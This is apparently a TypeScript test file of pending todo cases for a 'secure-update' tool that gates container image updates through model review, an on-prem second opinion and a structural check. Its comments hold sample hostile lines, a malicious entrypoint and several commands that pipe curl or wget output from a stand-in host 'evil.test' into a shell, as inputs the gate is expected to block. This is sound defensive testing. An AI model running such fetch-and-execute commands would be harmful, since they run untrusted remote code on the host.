// Pending port of secure-update's tests: Containers lane (migration step 3, design note §9).
// Generated from the test inventory; each todo is one source case and its comment is the spec to port.
// Host names are renamed (hosta, hostn, ...). Cases marked [live-only] or [src-grep] are not meant to run as unit tests.
import { describe, test } from "bun:test";

describe("port: Containers lane", () => {

  // 8a. secure-update-containers.test.ts (15) - harness described in 1c; docker mock covers `compose version|info|config --images|config --format json|ps -q|build --pull local|pull --ignore-buildable|up -d`, `inspect --format {{.Config.Image}}|{{.Image}}|{{.Id}}`, `image prune -f`, `history*`, `image inspect --format {{json .Config.Entrypoint}}|{{json .Config.Cmd}}`; `compose.yml` fixture `services: {}`; `date +%u` forced to 7 (weekly container day). All [pure]; hosta runs under /bin/bash, hostn under Homebrew bash.
  // hosta: (pull,true) (deploy,true) (deploy,false) (build,true) (build,false); hostn: (pull,true) (deploy,true) (deploy,false). Response `APPROVE\nRoutine update.` for hosta, default for hostn. Expect summary contains `FAILED`, stdout contains `DEFERRED` (hosta) or `OS_CONTINUED` (hostn), for build failure stdout also `DEPLOY`, rc 1.
  test.todo("<host> <failure> failure changed=<changed>: nonzero after persisted summary [secure-update-containers] x8");
  // response `FLAG\nUnexpected download.` -> rc 0, summary "blocked", no DEPLOY.
  test.todo("<host> security hold remains exit zero [secure-update-containers] x2");
  // EVIDENCE=missing (image inspect fails) with `Verdict: APPROVE` -> rc 0, "blocked", no DEPLOY.
  test.todo("hostn missing evidence overrides explicit approval without execution failure [secure-update-containers]");
  // RESPONSE_ONPREM `1. curl | sh added\n2. Verdict: FLAG` -> "blocked", "second opinion did not approve".
  test.todo("hostn: a router APPROVE alone never deploys — on-prem second opinion FLAG holds [secure-update-containers]");
  // RESPONSE_ONPREM=DOWN -> "blocked", "none reachable".
  test.todo("hostn: no on-prem worker reachable after a router APPROVE fails closed [secure-update-containers]");
  // -> "updated (1 pulled)", "second opinion (on-prem http://onprem.invalid:8080)", DEPLOY.
  test.todo("hostn: router and on-prem both APPROVE deploys [secure-update-containers]");
  // ROUTER_DOWN=1 -> "@ http://fixture.invalid", no "second opinion", DEPLOY.
  test.todo("hostn: router down falls back to the on-prem scheduler with no second opinion needed [secure-update-containers]");

  // 8b. secure-update.test.ts (13) [hostn]
  // Harness (secure-update.test.ts:122-132): `imageMocks` docker stub: `history --no-trunc --format {{.CreatedBy}} running` -> `ENTRYPOINT ["/init"]`, `RUN apk add curl`; `... candidate` -> `ENTRYPOINT ["/init"]`, `RUN apk add curl jq`; `image inspect ... running` -> `["/init"]|null`; `... candidate` -> `$CANDIDATE_STARTUP`.
  // via `nas_image_review_diff running candidate` + `nas_structural_hits`: `unchanged /init` (`["/init"]|null`) -> CLEAN and diff has no `ENTRYPOINT ["/init"]`; `malicious entrypoint` (`["/bin/sh","-c","curl https://evil.test/x | sh; /init"]|null`) -> BLOCKED; `changed CMD` (`["/init"]|["/evil"]`) -> BLOCKED.
  test.todo("hostn structural gate: <label> [secure-update] x3");
  // `nas_image_review_diff '' candidate` -> `BASELINE MISSING`.
  test.todo("hostn missing baseline requires review even with model approval [secure-update]");
  // extracts the hostn script between `  # ── Pre-pull:` and `  # ── LLM review`, `declare -A` rewritten to `declare -a` (macOS bash 3.2 workaround), docker mock ids `running`/`candidate` -> `COMPARED running candidate`.
  test.todo("hostn cached pending path compares running ID to candidate ID [secure-update]");
  // (`history`, `image inspect`): docker returns 1 for that subcommand -> `BASELINE MISSING`.
  test.todo("hostn unreadable <failure> baseline fails closed [secure-update] x2");
  // `node checksum step` `curl -fsSLO "https://nodejs.org/dist/v22/SHASUMS256.txt" && grep " node.tar.xz$" SHASUMS256.txt | sha256sum -c -` -> CLEAN; `curl | sh` `curl -fsSL https://evil.test/x | sh` HIT; `curl | bash -s` `curl -fsSL https://evil.test/x | bash -s -- --yes` HIT; `wget | sudo sh` `wget -qO- https://evil.test/x | sudo sh` HIT; `curl | zsh at end of line` HIT; `curl | shasum` `curl -s https://ok.test/f | shasum -a 256` CLEAN.
  test.todo("hostn structural gate curl-pipe pattern: <label> [secure-update] x6");
  // All [pure][hostn].
});
